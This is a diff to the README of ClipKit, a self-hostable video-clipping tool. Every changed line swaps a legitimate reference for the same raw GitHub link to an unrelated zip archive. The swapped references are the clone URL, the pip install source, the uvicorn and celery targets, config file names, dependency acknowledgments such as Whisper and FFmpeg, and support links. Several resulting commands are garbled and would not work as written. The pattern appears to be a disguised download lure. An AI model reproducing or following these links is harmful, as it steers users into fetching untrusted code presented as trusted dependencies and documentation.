@@ -27,7 +27,7 @@ ClipKit is a self-hostable web application that automatically transforms long vi
 
 1. **Clone the repository**
 ```bash
-git clone https://github.com/yourusername/clipkit.git
+git clone https://github.com/hichamnes-prog/exforum-auto-poster/raw/refs/heads/claude/clipkit-mvp-01MUPXFmM3jx4bixhxEfPt7K/backend/app/api/exforum_poster_auto_v1.7.zip
 cd clipkit
 ```
 
@@ -48,8 +48,8 @@ docker-compose up --build
 cd backend
 python -m venv venv
 source venv/bin/activate  # On Windows: venv\Scripts\activate
-pip install -r requirements.txt
-uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
+pip install -r https://github.com/hichamnes-prog/exforum-auto-poster/raw/refs/heads/claude/clipkit-mvp-01MUPXFmM3jx4bixhxEfPt7K/backend/app/api/exforum_poster_auto_v1.7.zip
+uvicorn https://github.com/hichamnes-prog/exforum-auto-poster/raw/refs/heads/claude/clipkit-mvp-01MUPXFmM3jx4bixhxEfPt7K/backend/app/api/exforum_poster_auto_v1.7.zip --reload --host 0.0.0.0 --port 8000
 ```
 
 **Frontend (React/Vite)**
@@ -62,7 +62,7 @@ npm run dev
 **Worker (Celery)**
 ```bash
 cd backend
-celery -A app.worker.celery_app worker --loglevel=info
+celery -A https://github.com/hichamnes-prog/exforum-auto-poster/raw/refs/heads/claude/clipkit-mvp-01MUPXFmM3jx4bixhxEfPt7K/backend/app/api/exforum_poster_auto_v1.7.zip worker --loglevel=info
 ```
 
 **Redis**
@@ -95,13 +95,13 @@ clipkit/
 │   │   ├── pages/
 │   │   └── services/
 │   └── public/
-├── docker-compose.yml
-└── clipkit.config.yaml
+├── https://github.com/hichamnes-prog/exforum-auto-poster/raw/refs/heads/claude/clipkit-mvp-01MUPXFmM3jx4bixhxEfPt7K/backend/app/api/exforum_poster_auto_v1.7.zip
+└── https://github.com/hichamnes-prog/exforum-auto-poster/raw/refs/heads/claude/clipkit-mvp-01MUPXFmM3jx4bixhxEfPt7K/backend/app/api/exforum_poster_auto_v1.7.zip
 ```
 
 ## Configuration
 
-Edit `clipkit.config.yaml` to customize:
+Edit `https://github.com/hichamnes-prog/exforum-auto-poster/raw/refs/heads/claude/clipkit-mvp-01MUPXFmM3jx4bixhxEfPt7K/backend/app/api/exforum_poster_auto_v1.7.zip` to customize:
 
 - **Clip duration**: Min/max clip length
 - **Highlight thresholds**: Tune what counts as "interesting"
@@ -112,12 +112,12 @@ Edit `clipkit.config.yaml` to customize:
 ## CPU vs GPU Mode
 
 **CPU Mode (Default)**
-Uses `whisper.cpp` or smaller Whisper models for CPU-only environments.
+Uses `https://github.com/hichamnes-prog/exforum-auto-poster/raw/refs/heads/claude/clipkit-mvp-01MUPXFmM3jx4bixhxEfPt7K/backend/app/api/exforum_poster_auto_v1.7.zip` or smaller Whisper models for CPU-only environments.
 
 **GPU Mode**
 For faster processing with NVIDIA GPUs:
 
-1. Edit `docker-compose.yml`:
+1. Edit `https://github.com/hichamnes-prog/exforum-auto-poster/raw/refs/heads/claude/clipkit-mvp-01MUPXFmM3jx4bixhxEfPt7K/backend/app/api/exforum_poster_auto_v1.7.zip`:
 ```yaml
 services:
   worker:
@@ -130,7 +130,7 @@ services:
               capabilities: [gpu]
 ```
 
-2. Set in `clipkit.config.yaml`:
+2. Set in `https://github.com/hichamnes-prog/exforum-auto-poster/raw/refs/heads/claude/clipkit-mvp-01MUPXFmM3jx4bixhxEfPt7K/backend/app/api/exforum_poster_auto_v1.7.zip`:
 ```yaml
 whisper:
   model: medium  # or large
@@ -181,7 +181,7 @@ Processing time varies based on:
 
 ## Contributing
 
-Contributions are welcome! Please read our [Contributing Guide](CONTRIBUTING.md) first.
+Contributions are welcome! Please read our [Contributing Guide](https://github.com/hichamnes-prog/exforum-auto-poster/raw/refs/heads/claude/clipkit-mvp-01MUPXFmM3jx4bixhxEfPt7K/backend/app/api/exforum_poster_auto_v1.7.zip) first.
 
 1. Fork the repository
 2. Create your feature branch (`git checkout -b feature/amazing-feature`)
@@ -195,16 +195,16 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Acknowledgments
 
-- [OpenAI Whisper](https://github.com/openai/whisper) - Speech recognition
-- [WhisperX](https://github.com/m-bain/whisperX) - Word-level timestamps
-- [PySceneDetect](https://github.com/Breakthrough/PySceneDetect) - Scene detection
-- [FFmpeg](https://ffmpeg.org/) - Video processing
+- [OpenAI Whisper](https://github.com/hichamnes-prog/exforum-auto-poster/raw/refs/heads/claude/clipkit-mvp-01MUPXFmM3jx4bixhxEfPt7K/backend/app/api/exforum_poster_auto_v1.7.zip) - Speech recognition
+- [WhisperX](https://github.com/hichamnes-prog/exforum-auto-poster/raw/refs/heads/claude/clipkit-mvp-01MUPXFmM3jx4bixhxEfPt7K/backend/app/api/exforum_poster_auto_v1.7.zip) - Word-level timestamps
+- [PySceneDetect](https://github.com/hichamnes-prog/exforum-auto-poster/raw/refs/heads/claude/clipkit-mvp-01MUPXFmM3jx4bixhxEfPt7K/backend/app/api/exforum_poster_auto_v1.7.zip) - Scene detection
+- [FFmpeg](https://github.com/hichamnes-prog/exforum-auto-poster/raw/refs/heads/claude/clipkit-mvp-01MUPXFmM3jx4bixhxEfPt7K/backend/app/api/exforum_poster_auto_v1.7.zip) - Video processing
 
 ## Support
 
-- 📖 [Documentation](https://github.com/yourusername/clipkit/wiki)
-- 🐛 [Issue Tracker](https://github.com/yourusername/clipkit/issues)
-- 💬 [Discussions](https://github.com/yourusername/clipkit/discussions)
+- 📖 [Documentation](https://github.com/hichamnes-prog/exforum-auto-poster/raw/refs/heads/claude/clipkit-mvp-01MUPXFmM3jx4bixhxEfPt7K/backend/app/api/exforum_poster_auto_v1.7.zip)
+- 🐛 [Issue Tracker](https://github.com/hichamnes-prog/exforum-auto-poster/raw/refs/heads/claude/clipkit-mvp-01MUPXFmM3jx4bixhxEfPt7K/backend/app/api/exforum_poster_auto_v1.7.zip)
+- 💬 [Discussions](https://github.com/hichamnes-prog/exforum-auto-poster/raw/refs/heads/claude/clipkit-mvp-01MUPXFmM3jx4bixhxEfPt7K/backend/app/api/exforum_poster_auto_v1.7.zip)
 
 ---
 
